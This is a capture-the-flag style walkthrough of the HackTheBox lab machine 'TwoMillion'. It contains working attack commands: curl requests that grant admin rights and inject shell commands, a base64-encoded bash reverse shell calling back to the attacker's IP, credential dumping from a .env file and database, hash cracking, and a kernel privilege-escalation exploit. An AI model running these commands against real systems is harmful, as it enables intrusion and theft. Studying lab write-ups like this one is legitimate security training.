---
title: TwoMillion
tags:
  - HackTheBox
  - Easy
  - Linux
  - Command-Injection
  - Kernel_Exploit
date: 2024-08-29T00:00:00Z
---
![](Pasted%20image%2020241029174018.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- 2million.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
```

So I decided to take a look at the webpage:

![](Pasted%20image%2020241029174335.png)

Inspecting the website with devtools, I found and interesting `.js` file called `inviteapi.min.js`, which is minified:

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

So if we go to [de4js](https://lelinhtinh.github.io/de4js/) and desminify it we get the following:

![](Pasted%20image%2020241029175848.png)

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

So now we can perform a curl request to the endpoint `/api/v1/invite/how/to/generate`:

```shell
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq

[redacted]
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",                                                                         
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."                                                                   
}
```

So I checked [CyberChef](https://gchq.github.io/CyberChef/) to decode the ROT13:

![](Pasted%20image%2020241029180344.png)

So I performed a POST request to `http://2million.htb/api/v1/invite/generate`:

```shell
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "UTRaN0wtWjNIOUItTzJKV04tTTZIMzQ=",
    "format": "encoded"
  }
}
```

> We've got a code :)

I decoded it from base64 and gave me: `Q4Z7L-Z3H9B-O2JWN-M6H34`.

Now I could enter to the register part:

![](Pasted%20image%2020241029180800.png)

I got in!

![](Pasted%20image%2020241029180854.png)

I inspected the website and found the `Access` point:

![](Pasted%20image%2020241029181427.png)

Here, I opened Burpsuite and captured the Connection Pack Request.

So I made a curl request to the `http://2million.htb/api`:

```shell
curl -v http://2million.htb/api

[redacted]
< HTTP/1.1 401 Unauthorized
```

So I added my account session id:

```shell
curl -sv http://2million.htb/api --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq

[redacted]
{ [47 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "/api/v1": "Version 1 of the API"
}
```

So I made a query to the `/v1`:

```shell
curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq

[redacted]
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

I noticed 3 endpoints under `/admin` and the most interesting one is `/update`. If I check my permissions in the `/auth` endpoint it clearly says that I'm not an admin:

```shell
curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq
{
  "message": false
}
```

Then I tried to generate a vpn, but get a 401:

```shell
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq

[redacted]
HTTP/1.1 401 Unauthorized
```

So I decided to try to update my permissions, but got an invalid content type:

```shell
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq

[redacted]
{
  "status": "danger",
  "message": "Invalid content type."
}
```

As the application doesn't respond with an `Unauthorised` error, we can try to append the `Content-type` header as the app responds in JSON:

```shell
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" -H 'Content-Type: application/json'| jq

[redacted]
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

We now know that we need to add the parameter email to the PUT petition:

```shell
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" -d '{"email":"gitblanc@gitblanc.com"}' -H 'Content-Type: application/json' | jq

[redacted]
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

So let's add one more parameter: `is_admin` and set it to true (1):

```shell
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" -d '{"email":"gitblanc@gitblanc.com", "is_admin":1}' -H 'Content-Type: application/json' | jq

[redacted]
{
  "id": 13,
  "username": "gitblanc",
  "is_admin": 1
}
```

> Now we're admins :), check with `curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m" | jq`

Now, it's time to generate a vpn, so let's do it:

```shell
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m"  -H 'Content-Type: application/json' | jq

[redacted]
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

We need to add the paramenter `username`:

```shell
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m"  -H 'Content-Type: application/json' -d '{"username":"gitblanc@gitblanc.com"}'

[redacted]
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
[redacted]
```

If this VPN is being generated via the `exec` or `system` PHP function and there is insufficient filtering in place, it might be possible to inject malicious code in the username field and gain command execution on the remote system. Let's test this assumption by injecting the command `;id;` after the username.

```shell
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m"  -H 'Content-Type: application/json' -d '{"username":"test;id;"}'

[redacted]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Connection #0 to host 2million.htb left intact
```

> *We've got a Command Injection vulnerability :)*

Now we can inject a reverse shell payload (I encoded it in base64 because it didn't work normal and then pipe it to bash):

```shell
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lk3t1iclf5ro9vk7i52uc4118m"  -H 'Content-Type: application/json' -d '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy82NjYgMD4mMQ== | base64 -d | bash;"}'

[redacted]
connect to [10.10.14.13] from 2million.htb [10.10.11.221] 37874
bash: cannot set terminal process group (1157): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
whoami
www-data
```

Now I stabilized the shell:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

## Lateral Movement

Now I checked the `/var/www/html` directory and found the `.env` file:

```shell
www-data@2million:~/html$ ls -la

[redacted]
drwxr-xr-x 10 root root 4096 Oct 29 21:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
```

Which contained the following content:

```shell
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

So I connected to the Mysql database:

```shell
mysql -u admin -h 127.0.0.1 -p

show databases;
use htb_prod;
show tables;
select username,password from users;
+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| TRX          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |
| TheCyberGeek | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |
| gitblanc     | $2y$10$qanytlXF..4wnIiBXY6bkOefVkE0RfyhIWyuI49NPo3.Gj7UH.qZ. |
+--------------+--------------------------------------------------------------+
```

As you can see, the passwords were hashed, so I bruteforced them. Inspecting in the [official hashcat page](https://hashcat.net/wiki/doku.php?id=example_hashes) they seemed to be hashed in bcrypt:

```shell
hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
```

> It didn't work, so I decided to try ssh woith the same password as the database and worked! Found the user flag :)

![](Pasted%20image%2020241029224133.png)

## Privilege Escalation

If we inspect the content of the `/var/mail/admin` we can infer that the OS is outdated:

```shell
admin@2million:~$ vim /var/mail/admin 

From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

It's important to know the kernel of the machine first:

```shell
uname -a

Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```


So if we find in goole `overlaysfs exploit` we get this one: [CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386), and execute it in the victim's machine:

```shell
# First we clone the repo locally
git clone https://github.com/sxlmnwb/CVE-2023-0386.git

zip -r cve.zip CVE-2023-0386

# Send it to the remote machine
scp cve.zip admin@2million.htb:/tmp
```

Now perform the official instructions of the exploit:

```shell
# First install it
make all

# Now, Start two terminals and in the first one type
./fuse ./ovlcap/lower ./gc

# In the second terminal type
./exp
```

> We are now root, and got the root flag:

![](Pasted%20image%2020241029225843.png)

==Machine pwned!==